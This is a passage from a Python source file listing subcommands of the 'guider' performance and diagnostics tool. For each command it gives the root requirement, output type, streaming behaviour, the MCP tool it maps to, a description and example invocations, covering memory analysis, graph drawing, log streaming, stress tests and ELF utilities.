    "scrcap": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Android screen capture",
        "examples": ["guider scrcap"],
    },
    "logand": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Write a message to Android logcat (message passed positionally or via -I, NOT -e)",
        "examples": ["guider logand \"hello world\"", "guider logand -I \"hello world\""],
    },
    "lmksnoop": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "60s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Stream Android LMK (Low Memory Killer) kill events in real-time via lmkd UDS socket",
        "examples": [
            "guider lmksnoop",
            "guider lmksnoop -q SUMMARY",
            "guider lmksnoop -q REASONFILTER:PRESSURE",
        ],
    },
    "cantop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": False,
        "description": "CAN bus signal top monitor",
        "main_arg_name": "iface",
        "main_arg_desc": "CAN interface name (e.g. 'vcan0', 'can0'); leave empty for auto-detect",
        "examples": ["guider cantop vcan0"],
    },
    "cansnoop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": False,
        "description": "CAN bus real-time per-frame streaming",
        "main_arg_name": "iface",
        "main_arg_desc": "CAN interface name (e.g. 'vcan0', 'can0'); leave empty for auto-detect",
        "examples": ["guider cansnoop vcan0"],
    },

    # ------------------------------------------------------------------ #
    #  memoryAnalyze                                                       #
    # ------------------------------------------------------------------ #
    "checkdup": {
        "requires_root": True,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "memoryAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Detect duplicate memory mappings across processes",
        "examples": ["guider checkdup", "guider checkdup -q SKIPEXMAPPED"],
    },
    "mem": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "memoryAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Per-process page-level memory info (requires target via -g <pid>)",
        "examples": ["guider mem -g <pid>"],
    },
    "leaktop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "memoryAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "User-space memory leak tracking top",
        "examples": ["guider leaktop -g <pid>"],
    },
    "leaktrace": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "memoryAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Memory allocation trace for leak analysis",
        "examples": ["guider leaktrace -g <pid>"],
    },
    "mtrace": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "memoryAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Memory trace and analysis; -J emits raw per-event JSON only and omits the leak/summary report that non-JSON output includes",
        "examples": ["guider mtrace -g <pid>", "guider mtrace -I \"sleep 1\" -o out -J"],
    },
    "dump": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "memoryAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Process memory dump snapshot",
        "examples": ["guider dump -g <pid>"],
    },

    # ------------------------------------------------------------------ #
    #  visualize                                                           #
    # ------------------------------------------------------------------ #
    "draw": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw performance graph from recorded data file",
        "examples": ["guider draw -I report.out"],
    },
    "drawtime": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw time-series graph from recorded data",
        "examples": ["guider drawtime -I report.out"],
    },
    "drawcpu": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw CPU usage graph",
        "examples": ["guider drawcpu -I report.out"],
    },
    "drawmem": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw memory usage graph",
        "examples": ["guider drawmem -I report.out"],
    },
    "drawnet": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw network usage graph",
        "examples": ["guider drawnet -I report.out"],
    },
    "drawdisk": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw disk I/O graph",
        "examples": ["guider drawdisk -I report.out"],
    },
    "drawflame": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw flame graph from stack data",
        "examples": ["guider drawflame -I stacks.out"],
    },
    "drawflamediff": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw differential flame graph between two or more stack data files, given as plain positional args (not -q AFTER:...); the visualize MCP tool currently only forwards a single file via input_file, so multi-file diffs cannot yet be passed through MCP",
        "examples": ["guider drawflamediff before.out after.out"],
    },
    "drawscatter": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw scatter plot from data",
        "examples": ["guider drawscatter -I data.out"],
    },
    "drawhist": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw histogram from data",
        "examples": ["guider drawhist -I data.out"],
    },
    "drawviolin": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw violin plot from data",
        "examples": ["guider drawviolin -I data.out"],
    },
    "drawstack": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw stacked area chart from data",
        "examples": ["guider drawstack -I data.out"],
    },
    "drawbitmap": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw bitmap representation of data",
        "examples": ["guider drawbitmap -I data.out"],
    },
    "drawconn": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw a live IPC pipe/socket connection graph for the current system (not file-based; optional positional PID via `target` to focus on one process, e.g. via visualize(target=\"1537\"))",
        "examples": ["guider drawconn", "guider drawconn 1537"],
    },
    "drawpsi": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw PSI (Pressure Stall Information) graph",
        "examples": ["guider drawpsi -I data.out"],
    },
    "drawreq": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw request latency graph",
        "examples": ["guider drawreq -I data.out"],
    },
    "drawrss": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw RSS (Resident Set Size) memory graph",
        "examples": ["guider drawrss -I data.out"],
    },
    "drawdiff": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw diff comparison graph between two or more datasets, given as plain positional args or a glob (not -q AFTER:...); the visualize MCP tool currently only forwards a single file via input_file, so multi-file diffs cannot yet be passed through MCP",
        "examples": ["guider drawdiff before.out after.out"],
    },
    "drawdelay": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw scheduling delay graph from recorded data",
        "examples": ["guider drawdelay -I report.out"],
    },
    "drawio": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw block I/O graph from recorded data",
        "examples": ["guider drawio -I report.out"],
    },
    "drawleak": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw memory-leak-highlighted graph from recorded data",
        "examples": ["guider drawleak -I report.out"],
    },
    "drawpri": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw thread priority graph from recorded data",
        "examples": ["guider drawpri -I report.out"],
    },
    "drawvss": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw VSS (Virtual Set Size) memory graph",
        "examples": ["guider drawvss -I report.out"],
    },
    "drawavg": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw averaged CPU+memory graphs across two or more input data files, given as plain positional args (not -q AFTER:...); needs at least 2 files, pass via the visualize MCP tool's input_files list",
        "examples": ["guider drawavg a.out b.out c.out"],
    },
    "drawcpuavg": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw averaged CPU usage graph across two or more input data files, given as plain positional args (not -q AFTER:...); needs at least 2 files, pass via the visualize MCP tool's input_files list",
        "examples": ["guider drawcpuavg a.out b.out c.out"],
    },
    "drawmemavg": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw averaged memory usage graph across two or more input data files, given as plain positional args (not -q AFTER:...); needs at least 2 files, pass via the visualize MCP tool's input_files list",
        "examples": ["guider drawmemavg a.out b.out c.out"],
    },
    "drawvssavg": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw averaged VSS memory graph across two or more input data files, given as plain positional args (not -q AFTER:...); needs at least 2 files, pass via the visualize MCP tool's input_files list",
        "examples": ["guider drawvssavg a.out b.out c.out"],
    },
    "drawrssavg": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Draw averaged RSS memory graph across two or more input data files, given as plain positional args (not -q AFTER:...); needs at least 2 files, pass via the visualize MCP tool's input_files list",
        "examples": ["guider drawrssavg a.out b.out c.out"],
    },
    "convert": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "visualize",
        "semaphore": False,
        "android_only": False,
        "description": "Render a text file as an image (text-to-image; positional FILE arg, not -I)",
        "examples": ["guider convert data.txt"],
    },

    # ------------------------------------------------------------------ #
    #  logAnalyze                                                          #
    # ------------------------------------------------------------------ #
    "logkmsg": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Kernel message log streaming (dmesg-like)",
        "examples": ["guider logkmsg"],
    },
    "logdlt": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "DLT (Diagnostic Log and Trace) log streaming",
        "examples": ["guider logdlt"],
    },
    "dlttop": {
        "requires_root": False,
        "output_type": "json",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": (
            "DLT top monitor — aggregated frequency view over a dlt-daemon connection (-X host:port) or local "
            "libdlt.so. guider's internal command table tags this Linux/MacOS only, but the restriction is not "
            "actually enforced on Linux (platform gating is only applied on Windows/MacOS/QNX branches)"
        ),
        "examples": ["guider dlttop", "guider dlttop -X localhost:12345"],
    },
    "logjrl": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Journald log streaming",
        "examples": ["guider logjrl"],
    },
    "logsys": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "System log streaming",
        "examples": ["guider logsys"],
    },
    "logtrace": {
        "requires_root": True,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "4.4",
        "mcp_tool": "ftraceProfile",
        "semaphore": True,
        "android_only": False,
        "description": "ftrace event log streaming",
        "examples": ["guider logtrace"],
    },
    "convlog": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Convert log files to structured format",
        "examples": ["guider convlog -I log.txt"],
    },
    "printand": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Print Android log file (offline; use -I logcat.txt)",
        "examples": ["guider printand -I logcat.txt"],
    },
    "printkmsg": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Print kernel message log file",
        "examples": ["guider printkmsg -I kmsg.txt"],
    },
    "printdlt": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Print DLT log file",
        "examples": ["guider printdlt -I trace.dlt"],
    },
    "printjrl": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Print journald log file",
        "examples": ["guider printjrl -I journal.log"],
    },
    "printtrace": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Print trace file",
        "examples": ["guider printtrace -I trace.out"],
    },
    "printsyslog": {
        "requires_root": True,
        "output_type": "text",
        "streaming": True,
        "default_duration": "10s",
        "min_kernel": "",
        "mcp_tool": "logAnalyze",
        "semaphore": False,
        "android_only": False,
        "description": "Tail the system syslog file (Linux only; needs root; ignores -I, always reads /var/log/syslog)",
        "examples": ["guider printsyslog -Q", "guider printsyslog -g \"*test*\" -J"],
    },

    # ------------------------------------------------------------------ #
    #  runCommand (generic pass-through — no dedicated specialized tool)  #
    # ------------------------------------------------------------------ #
    "cputest": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "3s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Generate CPU load for stress-testing (sort/matrix/fpu/memcpy workloads)",
        "main_arg_name": "load_ntask",
        "main_arg_desc": "positional LOAD[:NRTASK] (e.g. '250' or '250:4'); leave empty for default",
        "examples": ["guider cputest 250 -R 3", "guider cputest -q WORKLOAD:matrix -R 3"],
    },
    "memtest": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "3s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Allocate physical memory for stress-testing",
        "main_arg_name": "size_interval_count",
        "main_arg_desc": "positional SIZE[:INTERVAL:COUNT] (e.g. '1G' or '512M:1:0'); leave empty for default (100M)",
        "examples": ["guider memtest 1G -R 3", "guider memtest 512M -q PATTERN:seq -R 3"],
    },
    "iotest": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "3s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Run storage I/O operations and report elapsed time, MB/s, IOPS",
        "main_arg_name": "op_path",
        "main_arg_desc": "positional OP:PATH (e.g. 'read:/tmp/testfile'); leave empty for default read/write on cwd",
        "examples": ["guider iotest -i 3", "guider iotest read:TEST -R 5"],
    },
    "nettest": {
        "requires_root": False,
        "output_type": "text",
        "streaming": True,
        "default_duration": "3s",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Send UDP/TCP packets for network throughput/RTT testing",
        "main_arg_name": "protocol_ip_port",
        "main_arg_desc": "positional PROTOCOL:IP:PORT (e.g. 'tcp:192.168.1.1:9999'); leave empty for local loopback default",
        "examples": ["guider nettest -R 3", "guider nettest tcp:192.168.1.1:9999 -R 5"],
    },
    "list": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "List guider's own background/daemon processes (read-only)",
        "examples": ["guider list -J"],
    },

    # ------------------------------------------------------------------ #
    #  runCommand / androidPerf (util category — process/symbol/debug)    #
    # ------------------------------------------------------------------ #
    "addr2sym": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Resolve addresses/offsets to symbols from an ELF file or a running process",
        "main_arg_name": "target",
        "main_arg_desc": "FILE|PID|COMM to resolve against (also settable via -I); requires -g <OFFSET>",
        "examples": ["guider addr2sym -I /usr/bin/yes -g 0xab1cf", "guider addr2sym -I \"/usr/lib/*\" -g 0xab1cf"],
    },
    "sym2addr": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Resolve symbol names to addresses/offsets from an ELF file or a running process",
        "main_arg_name": "target",
        "main_arg_desc": "FILE|PID|COMM to resolve against (also settable via -I); requires -g <SYMBOL> (leave -g empty to list all)",
        "examples": ["guider sym2addr -I /usr/bin/yes -g testFunc", "guider sym2addr -I /bin/ls -g main"],
    },
    "demangle": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Demangle C++/Rust mangled symbol names",
        "main_arg_name": "symbols",
        "main_arg_desc": "mangled symbol, or '|'-separated list (e.g. '_ZN3art6Thread14CreateCallbackEPv')",
        "examples": ["guider demangle _ZN3art6Thread14CreateCallbackEPv -J"],
    },
    "retrace": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "De-obfuscate Android crash logs/stacks using an R8/ProGuard mapping.txt (-J is accepted but has no effect; output is always plain text)",
        "main_arg_name": "mapping_and_stack",
        "main_arg_desc": "comma-separated pair 'mapping.txt, stack.log' (exactly 2 existing file paths)",
        "examples": ["guider retrace \"mapping.txt, stack.log\""],
    },
    "printbind": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print dynamic-linker function binding status for a process (ptrace-based; no JSON support)",
        "main_arg_name": "task",
        "main_arg_desc": "target COMM|TID via -g (e.g. 'a.out'); optionally -c <FUNC> to filter one function",
        "examples": ["guider printbind -g a.out", "guider printbind -g a.out -c write"],
    },
    "dumpstack": {
        "requires_root": True,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "androidPerf",
        "semaphore": False,
        "android_only": True,
        "description": "Dump process stacks (via Android debuggerd) into a flame-graph SVG; '-q TREE' prints a text call tree instead. Currently Android-only at runtime (Linux path is unimplemented and exits with an error)",
        "main_arg_name": "target",
        "main_arg_desc": "PID|COMM, or comma-separated list (e.g. 'a.out, java')",
        "examples": ["guider dumpstack \"a.out, java\"", "guider dumpstack a.out -q TREE"],
    },
    "ps": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show the process/task list",
        "examples": ["guider ps -J", "guider ps -g a.out -J", "guider ps -S m -J"],
    },
    "pstree": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show the process tree",
        "main_arg_name": "comm_filter",
        "main_arg_desc": "COMM keyword filter, comma-separated (e.g. 'a.out, yes'); leave empty to show the full tree",
        "examples": ["guider pstree -J", "guider pstree a.out -J"],
    },
    "getpid": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Look up PID(s)/TID(s) by comm keyword",
        "main_arg_name": "keyword",
        "main_arg_desc": "COMM/PID keyword, wildcard or comma-separated (e.g. 'a.out' or '*chrome, *test*')",
        "examples": ["guider getpid a.out -J", "guider getpid \"*chrome\" -e t -J"],
    },
    "printsig": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show signal handler/pending/blocked status for a process",
        "main_arg_name": "target",
        "main_arg_desc": "PID|COMM, comma-separated (e.g. 'a.out, java')",
        "examples": ["guider printsig a.out -J", "guider printsig -g 1234 -J"],
    },
    "printns": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show Linux namespaces on the system (no JSON support)",
        "main_arg_name": "ns_filter",
        "main_arg_desc": "namespace type filter, e.g. 'cgroup, net'; leave empty for all",
        "examples": ["guider printns", "guider printns \"cgroup, net\""],
    },
    "printcg": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show the system cgroup tree",
        "main_arg_name": "subsystem",
        "main_arg_desc": "cgroup subsystem name filter, e.g. 'cpu' or 'cpu memory blkio'; leave empty for all",
        "examples": ["guider printcg -J", "guider printcg cpu -J"],
    },
    "printvma": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show kernel vmalloc memory objects on the system (no JSON support)",
        "main_arg_name": "keyword",
        "main_arg_desc": "keyword filter on the object caller (e.g. 'fork'); leave empty for all",
        "examples": ["guider printvma", "guider printvma -g fork"],
    },
    "printslab": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show kernel slab cache info (no JSON support)",
        "main_arg_name": "cache_name",
        "main_arg_desc": "slab cache name filter (e.g. 'dentry'); leave empty for all",
        "examples": ["guider printslab dentry", "guider printslab -S size"],
    },
    "getafnt": {
        "requires_root": True,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show CPU affinity mask of threads (no JSON support)",
        "main_arg_name": "target",
        "main_arg_desc": "TID|COMM, comma-separated (e.g. 'a.out, 1234')",
        "examples": ["guider getafnt -g a.out, 1234"],
    },

    # ------------------------------------------------------------------ #
    #  runCommand (util category — file/ELF/format tools)                 #
    # ------------------------------------------------------------------ #
    "readelf": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show ELF header/section/symbol/DWARF info for a binary",
        "examples": ["guider readelf -I /usr/bin/yes", "guider readelf -I /usr/bin/yes -q DEBUGINFO"],
    },
    "elftree": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show shared-library dependency tree of an ELF file",
        "main_arg_name": "file",
        "main_arg_desc": "target ELF file path",
        "examples": ["guider elftree test.bin -J", "guider elftree test.bin -H 2 -J"],
    },
    "readdex": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Show DEX file info (classes/methods/strings) from a DEX/APK/JAR",
        "examples": ["guider readdex -I classes.dex -J", "guider readdex -I base.apk -q CLASSFILTER:\"*IActivity*\" -J"],
    },
    "readapk": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Analyze an Android APK: manifest, DEX, signing, native libs, resources",
        "examples": ["guider readapk -I app.apk -J", "guider readapk -I app.apk -q ONLYHEADER -J"],
    },
    "strings": {
        "requires_root": False,
        "output_type": "text",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Print sequences of printable characters in a file",
        "examples": ["guider strings -I a.out", "guider strings -I a.out -g PEACE"],
    },
    "comp": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Compress one or more files/dirs (gzip, zip, or base64)",
        "main_arg_name": "path",
        "main_arg_desc": "file/dir path(s) to compress, comma-separated",
        "examples": ["guider comp guider.out", "guider comp guider.out -o guider.out.gz"],
    },
    "decomp": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Decompress files (gzip, lzma, zip, tar, base64, apk, zlib)",
        "main_arg_name": "path",
        "main_arg_desc": "compressed file path to decompress",
        "examples": ["guider decomp guider.zip -o ./test"],
    },
    "split": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Split a file into chunks by size and/or count",
        "main_arg_name": "path",
        "main_arg_desc": "file path to split",
        "examples": ["guider split \"guider.tgz\" -q CHUNK:10m"],
    },
    "merge": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Merge multiple files into a single output file",
        "main_arg_name": "paths",
        "main_arg_desc": "comma-separated file paths to merge, in order",
        "examples": ["guider merge \"guider.tgz, guider2.tgz\" -o guiderMerged.mg"],
    },
    "mkcache": {
        "requires_root": False,
        "output_type": "file",
        "streaming": False,
        "default_duration": "",
        "min_kernel": "",
        "mcp_tool": "runCommand",
        "semaphore": False,
        "android_only": False,
        "description": "Build ELF symbol caches for specific files or running processes",
        "main_arg_name": "target",
        "main_arg_desc": "file path(s) or PID|COMM, comma-separated",
        "examples": ["guider mkcache /usr/bin/yes", "guider mkcache \"a.out, yes\" -q SEQUENTIAL"],
    },
    "dirdiff": {
        "requires_root": False,
        "output_type": "json",
        "streaming": False,
        "default_duration": "",
